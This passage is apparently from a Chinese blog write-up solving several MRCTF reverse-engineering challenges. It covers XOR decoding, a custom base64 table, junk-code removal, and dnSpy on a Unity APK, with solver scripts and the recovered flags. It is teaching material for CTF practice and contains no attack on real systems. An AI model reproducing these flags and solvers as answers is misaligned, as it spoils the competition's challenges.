<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>]=&#123;<span class="number">0x4D</span>,<span class="number">0x53</span>,<span class="number">0x41</span>,<span class="number">0x57</span>,<span class="number">0x42</span>,<span class="number">0x7E</span>,<span class="number">0x46</span>,<span class="number">0x58</span>,<span class="number">0x5A</span>,<span class="number">0x3A</span>,<span class="number">0x4A</span>,<span class="number">0x3A</span>,<span class="number">0x60</span>,<span class="number">0x74</span>,<span class="number">0x51</span>,<span class="number">0x4A</span>,<span class="number">0x22</span>,<span class="number">0x4E</span>,<span class="number">0x40</span>,<span class="number">0x20</span>,<span class="number">0x62</span>,<span class="number">0x70</span>,<span class="number">0x64</span>,<span class="number">0x64</span>,<span class="number">0x7D</span>,<span class="number">0x38</span>,<span class="number">0x67</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(flag);i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span> tmp=flag[i];</span><br><span class="line">		tmp^=i;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>,tmp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag:MRCTF{@_R3@1ly_E2_R3verse!}</p>
<h3 id="Transform"><a href="#Transform" class="headerlink" title="Transform"></a>Transform</h3><p>其实就是个简单的字符置换，可以试试输入有规律的字符串，然后dump出处理过后的字符串<br>这样就知道置换矩阵了，拿出数据置换一下，异或一下就是flag。。</p>
<h3 id="撸啊撸"><a href="#撸啊撸" class="headerlink" title="撸啊撸"></a>撸啊撸</h3><p>这道题目其实题目名有很大的提示，lua lu<br>这个使用C++内嵌lua写的，不然为什么会显示”I need My friend to help me check your flag!”<br>只需要根据判断逻辑逆向思考，可以看出sub_7FF650AFD980是个很重要的函数<br>然后观察它的参数，发现出入了一个乱七八糟的字符串。<br>看不出来是啥，但是如果动调，就会发现这个字符串被修改了，看的懂了</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cmps=&#123;<span class="number">83</span>,<span class="number">80</span>,<span class="number">73</span>,<span class="number">80</span>,<span class="number">76</span>,<span class="number">125</span>,<span class="number">61</span>,<span class="number">96</span>,<span class="number">107</span>,<span class="number">85</span>,<span class="number">62</span>,<span class="number">63</span>,<span class="number">121</span>,<span class="number">122</span>,<span class="number">101</span>,<span class="number">33</span>,<span class="number">123</span>,<span class="number">82</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">54</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">85</span>,<span class="number">111</span>,<span class="number">39</span>,<span class="number">97</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Give Me Your Flag LOL!:"</span>)</span><br><span class="line">flag=<span class="built_in">io</span>.<span class="built_in">read</span>()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">len</span>(flag)~=<span class="number">29</span> <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">"Wrong flag!"</span>)</span><br><span class="line">	<span class="built_in">os</span>.<span class="built_in">exit</span>()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i=<span class="number">1</span>,<span class="built_in">string</span>.<span class="built_in">len</span>(flag) <span class="keyword">do</span></span><br><span class="line">	<span class="keyword">local</span> x=<span class="built_in">string</span>.<span class="built_in">byte</span>(flag,i)</span><br><span class="line">	<span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">		x=x~i</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		x=x+<span class="number">6</span></span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	<span class="keyword">if</span> x~=cmps[i] <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">"Wrong flag!"</span>)</span><br><span class="line">		<span class="built_in">os</span>.<span class="built_in">exit</span>()</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Right flag!"</span>)</span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">exit</span>()</span><br></pre></td></tr></table></figure>

<p>这里的~是异或的意思，就很容易看懂了<br>EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">83</span>,<span class="number">80</span>,<span class="number">73</span>,<span class="number">80</span>,<span class="number">76</span>,<span class="number">125</span>,<span class="number">61</span>,<span class="number">96</span>,<span class="number">107</span>,<span class="number">85</span>,<span class="number">62</span>,<span class="number">63</span>,<span class="number">121</span>,<span class="number">122</span>,<span class="number">101</span>,<span class="number">33</span>,<span class="number">123</span>,<span class="number">82</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">54</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">85</span>,<span class="number">111</span>,<span class="number">39</span>,<span class="number">97</span>]</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">29</span>):</span><br><span class="line">	x=a[i<span class="number">-1</span>]</span><br><span class="line">	<span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">		x^=i</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		x-=<span class="number">6</span></span><br><span class="line">	flag+=chr(x)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<h3 id="PixelShooter"><a href="#PixelShooter" class="headerlink" title="PixelShooter"></a>PixelShooter</h3><p>这道题目使用了Unity写的个小游戏<br>表面上是apk，其实是个C#逆向<br>大部分的Unity都是用C#写的，其中有个存储逻辑代码的C#二进制文件<br>Assembly-Csharp.dll<br>所以只要找到这个玩意就是了<br>apk解包，PixelShooter.apk\assets\bin\Data\Managed下面就是了<br>dnspy打开<br><img src="https://i.loli.net/2020/03/25/4o1ih7XCDgtVmlr.png" alt=""><br>即可在UIController下找到flag<br>MRCTF{Unity_1S_Fun_233}</p>
<h3 id="Junk"><a href="#Junk" class="headerlink" title="Junk"></a>Junk</h3><p>这道题如同其名字，Junk<br>往里面塞了很多JunkCode，只要一个个去掉就是了，U和C键交替(里面插了许多0xE8字节来迷惑IDA)<br>顺便把一些稀里糊涂的Call给删了(通过Call一个函数，函数里修改了EIP的值，进行跳转，这会导致F5分析失败)<br><img src="https://i.loli.net/2020/03/25/wynAMXpQ3ulLGvB.png" alt=""><br>可以仔细分析一下，这里对输入进行了异或<br>然后实现了循环左移和右移的操作，鉴于位移四位，其实左移右移都是一样的<br>这里还有个奇怪的函数sub_B81090，对数据进行了奇怪的操作<br>点开看看</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __fastcall <span class="title">sub_B81090</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v6; <span class="comment">// ah</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v7; <span class="comment">// dh</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v8; <span class="comment">// bh</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v9; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">bool</span> v11; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v12; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+8h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [esp+11h] [ebp-Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [esp+12h] [ebp-Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [esp+13h] [ebp-9h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v20; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v21; <span class="comment">// [esp+15h] [ebp-7h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v22; <span class="comment">// [esp+16h] [ebp-6h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v23; <span class="comment">// [esp+1Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15 = v2 - <span class="number">1</span>;</span><br><span class="line">      v5 = *a1++;</span><br><span class="line">      *(&amp;v20 + v3++) = v5;</span><br><span class="line">      v6 = v22;</span><br><span class="line">      v7 = v21;</span><br><span class="line">      v8 = v20;</span><br><span class="line">      v23 = v22;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = (v22 &gt;&gt; <span class="number">6</span>) + <span class="number">4</span> * (v21 &amp; <span class="number">0xF</span>);</span><br><span class="line">        v17 = (v21 &gt;&gt; <span class="number">4</span>) + <span class="number">16</span> * (v20 &amp; <span class="number">3</span>);</span><br><span class="line">        v18 = (v22 &gt;&gt; <span class="number">6</span>) + <span class="number">4</span> * (v21 &amp; <span class="number">0xF</span>);</span><br><span class="line">        v19 = v22 &amp; <span class="number">0x3F</span>;</span><br><span class="line">        v16 = v20 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        byte_BA1708[v4] = byte_B9EA00[v20 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        byte_BA1709[v4] = byte_B9EA00[(<span class="keyword">unsigned</span> __int8)((v7 &gt;&gt; <span class="number">4</span>) + <span class="number">16</span> * (v8 &amp; <span class="number">3</span>))];</span><br><span class="line">        byte_BA170A[v4] = byte_B9EA00[v9];</span><br><span class="line">        byte_BA170B[v4] = byte_B9EA00[v6 &amp; <span class="number">0x3F</span>];</span><br><span class="line">        v4 += <span class="number">4</span>;</span><br><span class="line">        v3 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = v15;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v15 );</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = v3;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = v23;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v11 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 &lt; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !v11 )</span><br><span class="line">          &#123;</span><br><span class="line">            sub_B8150A(a1);</span><br><span class="line">            JUMPOUT(*(_DWORD *)algn_B811F3);</span><br><span class="line">          &#125;</span><br><span class="line">          *(&amp;v20 + v10++) = <span class="number">0</span>;</span><br><span class="line">          v11 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10 &lt; <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v10 &lt; <span class="number">3</span> );</span><br><span class="line">        v12 = v22;</span><br><span class="line">        v7 = v21;</span><br><span class="line">        v8 = v20;</span><br><span class="line">      &#125;</span><br><span class="line">      v16 = v8 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      v17 = (v7 &gt;&gt; <span class="number">4</span>) + <span class="number">16</span> * (v8 &amp; <span class="number">3</span>);</span><br><span class="line">      LOBYTE(v2) = v12 &gt;&gt; <span class="number">6</span>;</span><br><span class="line">      v19 = v12 &amp; <span class="number">0x3F</span>;</span><br><span class="line">      v18 = (v12 &gt;&gt; <span class="number">6</span>) + <span class="number">4</span> * (v7 &amp; <span class="number">0xF</span>);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v3 + <span class="number">1</span>; ++v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = (<span class="keyword">unsigned</span> __int8)*(&amp;v16 + i++);</span><br><span class="line">        LOBYTE(v2) = byte_B9EA00[v2];</span><br><span class="line">        byte_BA1708[v4] = v2;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &lt; <span class="number">3</span> )</span><br><span class="line">        LOBYTE(v2) = sub_B822E0(&amp;byte_BA1708[v4], <span class="number">46</span>, <span class="number">3</span> - v3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不难发现就是个base64变种，不过就是把表换了一下，等于号换成点而已<br>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&amp;*(+/<br>最后在和已有字符串比较<br>所以思路很简单: 解变种base64-&gt;循环左移4位-&gt;异或3-&gt;得到flag<br>EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">orig=<span class="string">"%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm%w.."</span></span><br><span class="line">orig=orig.replace(<span class="string">')'</span>,<span class="string">'0'</span>)</span><br><span class="line">orig=orig.replace(<span class="string">'!'</span>,<span class="string">'1'</span>)</span><br><span class="line">orig=orig.replace(<span class="string">'@'</span>,<span class="string">'2'</span>)</span><br><span class="line">orig=orig.replace(<span class="string">'#'</span>,<span class="string">'3'</span>)</span><br><span class="line">orig=orig.replace(<span class="string">'$'</span>,<span class="string">'4'</span>)</span><br><span class="line">orig=orig.replace(<span class="string">'%'</span>,<span class="string">'5'</span>)</span><br><span class="line">orig=orig.replace(<span class="string">'^'</span>,<span class="string">'6'</span>)</span><br><span class="line">orig=orig.replace(<span class="string">'&amp;'</span>,<span class="string">'7'</span>)</span><br><span class="line">orig=orig.replace(<span class="string">'*'</span>,<span class="string">'8'</span>)</span><br><span class="line">orig=orig.replace(<span class="string">'('</span>,<span class="string">'9'</span>)</span><br><span class="line">orig=orig.replace(<span class="string">'.'</span>,<span class="string">'='</span>)</span><br><span class="line"><span class="keyword">print</span> orig</span><br><span class="line">code=base64.b64decode(orig).encode(<span class="string">'hex'</span>)</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,len(code),<span class="number">2</span>):</span><br><span class="line">	num=int(code[x:x+<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">	num=(((num&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xff</span>) | ((num&lt;&lt;<span class="number">4</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line">	flag+=chr(num^<span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>MRCTF{junkjunkjunkcodejunkjunkcodejunkcode}</p>
<h3 id="EasyCPP"><a href="#EasyCPP" class="headerlink" title="EasyCPP"></a>EasyCPP</h3><p>程序运用了较多的C++特性<br>所以代码看起来会比较冗杂，好在给了符号<br>总体上是要输入9个数字，并存入了Vector<br><img src="https://i.loli.net/2020/03/25/5xQuETaI1vhwWCL.png" alt=""><br>然后通过lambda表达式进行了每个数字异或1的操作，然后对结果调用了个depart的函数<br>得到一个string的结果，最后和原有的9个奇怪字符串比较<br><img src="https://i.loli.net/2020/03/25/9L8kPIFEsxQneK2.png" alt=""><br>最后输出九个数字拼起来的字符串，flag就是要把这九个数字拼起来进行md5校验后包起来<br><img src="https://i.loli.net/2020/03/25/y3T6WJqzQXSlcLI.png" alt=""></p>
<p>然后来分析下depart函数和那个负责替换的lambda表达式</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">depart</span><span class="params">(<span class="keyword">int</span> a1, __int64 a2, <span class="keyword">double</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+6Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">2</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">sqrt</span>&lt;<span class="keyword">int</span>&gt;((<span class="keyword">unsigned</span> <span class="keyword">int</span>)a1); <span class="comment">//枚举到根号n</span></span><br><span class="line">    <span class="keyword">if</span> ( a3 &lt; (<span class="keyword">double</span>)i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(a1 % i) )  <span class="comment">//能分解就分解</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = i;</span><br><span class="line">      depart((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 / i), a2); <span class="comment">//递归分解</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::to_string((<span class="built_in">std</span>::__cxx11 *)&amp;v5, v7); <span class="comment">//将数字转为字符串以空格为间隔符合并起来</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v4, &amp;unk_500C, &amp;v5);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>+=(a2, &amp;v4);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后那个比较函数其实就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">replace(a.begin(),a.end(),&#39;0&#39;,&#39;O&#39;);</span><br><span class="line">replace(a.begin(),a.end(),&#39;1&#39;,&#39;l&#39;);</span><br><span class="line">replace(a.begin(),a.end(),&#39;2&#39;,&#39;z&#39;);</span><br><span class="line">replace(a.begin(),a.end(),&#39;3&#39;,&#39;E&#39;);</span><br><span class="line">replace(a.begin(),a.end(),&#39;4&#39;,&#39;A&#39;);</span><br><span class="line">replace(a.begin(),a.end(),&#39;5&#39;,&#39;s&#39;);</span><br><span class="line">replace(a.begin(),a.end(),&#39;6&#39;,&#39;G&#39;);</span><br><span class="line">replace(a.begin(),a.end(),&#39;7&#39;,&#39;T&#39;);</span><br><span class="line">replace(a.begin(),a.end(),&#39;8&#39;,&#39;B&#39;);</span><br><span class="line">replace(a.begin(),a.end(),&#39;9&#39;,&#39;q&#39;);</span><br><span class="line">replace(a.begin(),a.end(),&#39; &#39;,&#39;&#x3D;&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/25/1H6aydCUB3XWnbD.png" alt=""><br>将这些东西替换回数字，再把这些数字乘起来，再异或1一下就是输入的九个数字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2345</span><br><span class="line">1222</span><br><span class="line">5774</span><br><span class="line">2476</span><br><span class="line">3374</span><br><span class="line">9032</span><br><span class="line">2456</span><br><span class="line">3531</span><br><span class="line">6720</span><br><span class="line">MRCTF&#123;4367FB5F42C6E46B2AF79BF409FB84D3&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Shit"><a href="#Shit" class="headerlink" title="Shit"></a>Shit</h3><p>这道题目是临时出的，其实只要过掉开局的一个死循环，也可以attach，然后dump出密钥<br>就可以直接进行解密了，解密算法其实就是加密算法的逆向过程，全是位运算</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//key就是密钥 请直接dump</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ks[<span class="number">6</span>]=&#123;<span class="number">0x8c2c133a</span>,<span class="number">0xf74cb3f6</span>,<span class="number">0xfedfa6f2</span>,<span class="number">0xab293e3b</span>,<span class="number">0x26cf8a2a</span>,<span class="number">0x88a1f279</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> k=<span class="number">0</span>,bk=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">5</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">		<span class="keyword">if</span>(i&gt;<span class="number">0</span>)</span><br><span class="line">			ks[i]^=ks[i<span class="number">-1</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i+=<span class="number">4</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		k=ks[i/<span class="number">4</span>];</span><br><span class="line">		k=(<span class="number">1</span>&lt;&lt;key[i/<span class="number">4</span>])^k;</span><br><span class="line">		k=((k&gt;&gt;<span class="number">16</span>)) | ((~(k&lt;&lt;<span class="number">16</span>))&amp;<span class="number">0xffff0000</span>);</span><br><span class="line">		k=((k&lt;&lt;key[i/<span class="number">4</span>])) | (k&gt;&gt;(<span class="number">32</span>-key[i/<span class="number">4</span>]));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%X\n"</span>,k);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密出六个int，直接转ascii就是flag</p>
